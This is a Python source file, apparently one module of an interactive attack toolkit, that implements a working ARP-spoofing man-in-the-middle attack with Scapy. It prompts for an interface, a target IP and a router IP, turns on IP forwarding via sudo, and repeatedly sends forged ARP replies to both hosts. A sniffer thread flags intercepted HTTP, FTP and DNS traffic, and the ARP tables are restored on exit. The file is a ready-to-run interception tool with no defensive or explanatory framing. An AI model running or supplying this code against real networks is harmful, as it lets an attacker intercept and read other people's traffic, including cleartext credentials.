import os
import time
import threading
from scapy.all import ARP, sendp, Ether, srp, IP, TCP, UDP, sniff, conf
from rich.console import Console
from rich.table import Table
from core.ui import draw_header

console = Console()

def get_interfaces():
    """Lists available network interfaces for selection."""
    interfaces = []
    # Scapy's internal interface list provides reliable cross-platform names
    for iface in conf.ifaces.data.values():
        interfaces.append(iface.name)
    return interfaces

def toggle_forwarding(state=True):
    """Enables or disables IP forwarding on the host OS."""
    value = 1 if state else 0
    try:
        if os.uname().sysname == 'Darwin': # macOS
            os.system(f"sudo sysctl -w net.inet.ip.forwarding={value} > /dev/null")
        else: # Linux
            os.system(f"echo {value} | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
    except:
        console.print("[yellow][!] Manual IP forwarding check required.[/yellow]")

def get_mac(ip, iface):
    """Resolves MAC address specifically on the chosen interface."""
    try:
        # We must specify the interface (iface) to resolve MACs on Wi-Fi
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                     timeout=2, verbose=False, iface=iface)
        if ans:
            return ans[0][1].hwsrc
    except:
        return None

def packet_callback(packet):
    """Sniffs and displays interesting data from the intercepted stream."""
    if packet.haslayer(IP):
        if packet.haslayer(TCP):
            port = packet[TCP].dport
            if port == 80:
                console.print(f"[bold cyan][HTTP][/bold cyan] {packet[IP].src} -> {packet[IP].dst}")
            elif port == 21:
                console.print(f"[bold red][FTP][/bold red] {packet[IP].src} -> {packet[IP].dst}")
        elif packet.haslayer(UDP) and packet[UDP].dport == 53:
            console.print(f"[bold magenta][DNS][/bold magenta] {packet[IP].src} is querying a domain.")

def start_mitm():
    draw_header("MITM Engine v2.1 (WLAN Support)")
    
    # 1. Interface Selection Logic
    ifaces = get_interfaces()
    table = Table(title="Available Interfaces", border_style="cyan")
    table.add_column("ID", style="bold")
    table.add_column("Interface Name")
    
    for i, name in enumerate(ifaces):
        table.add_row(str(i), name)
    
    console.print(table)
    iface_id = console.input("[bold yellow]Select Interface ID (Default 0): [/bold yellow]").strip() or "0"
    chosen_iface = ifaces[int(iface_id)]
    
    target = console.input("[bold yellow]Target IP: [/bold yellow]").strip()
    router = console.input("[bold yellow]Router IP: [/bold yellow]").strip()

    if not target or not router: return

    console.print(f"[bold blue][*][/bold blue] Resolving MACs on [cyan]{chosen_iface}[/cyan]...")
    t_mac = get_mac(target, chosen_iface)
    r_mac = get_mac(router, chosen_iface)

    if not t_mac or not r_mac:
        console.print("[red]Failure: Could not resolve MAC. Is the target on this interface?[/red]")
        return

    toggle_forwarding(True)
    
    console.print(f"[bold red][!] Intercepting: {target} <--> {router}[/bold red]")
    
    stop_event = threading.Event()
    # Sniffing must be explicitly locked to the chosen interface
    sniff_thread = threading.Thread(target=lambda: sniff(iface=chosen_iface, prn=packet_callback, store=0, stop_filter=lambda p: stop_event.is_set()))
    sniff_thread.start()

    try:
        while True:
            # Poisoning with explicit interface context (iface=chosen_iface)
            target_packet = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=router)
            sendp(target_packet, verbose=False, iface=chosen_iface)
            
            router_packet = Ether(dst=r_mac) / ARP(op=2, pdst=router, hwdst=r_mac, psrc=target)
            sendp(router_packet, verbose=False, iface=chosen_iface)
            
            time.sleep(2)
            
    except KeyboardInterrupt:
        stop_event.set()
        console.print("\n[yellow][*] Restoring network integrity...[/yellow]")
        toggle_forwarding(False)
        
        restore_target = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=router, hwsrc=r_mac)
        restore_router = Ether(dst=r_mac) / ARP(op=2, pdst=router, hwdst=r_mac, psrc=target, hwsrc=t_mac)
        
        sendp(restore_target, count=5, verbose=False, iface=chosen_iface)
        sendp(restore_router, count=5, verbose=False, iface=chosen_iface)
        
        console.print("[green][+] Network restored. MITM Session Closed.[/green]")
        input("\nPress Enter to return...")